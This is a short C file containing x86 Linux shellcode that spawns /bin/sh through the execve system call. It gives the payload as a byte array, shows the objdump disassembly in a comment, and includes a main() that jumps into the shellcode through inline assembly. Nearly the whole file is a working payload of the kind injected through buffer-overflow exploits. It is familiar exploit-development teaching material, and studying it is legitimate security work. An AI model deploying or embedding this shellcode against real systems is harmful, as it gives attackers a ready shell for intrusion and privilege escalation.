char shellcode[]=
"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";
/*
 80481e0:       31 d2                   xor    %edx,%edx
 80481e2:       52                      push   %edx
 80481e3:       68 6e 2f 73 68          push   $0x68732f6e
 80481e8:       68 2f 2f 62 69          push   $0x69622f2f
 80481ed:       89 e3                   mov    %esp,%ebx
 80481ef:       52                      push   %edx
 80481f0:       53                      push   %ebx
 80481f1:       89 e1                   mov    %esp,%ecx
 80481f3:       8d 42 0b                lea    0xb(%edx),%eax
 80481f6:       cd 80                   int    $0x80
*/
int main()
{
    __asm__
    ("
        call	shellcode
    ");
}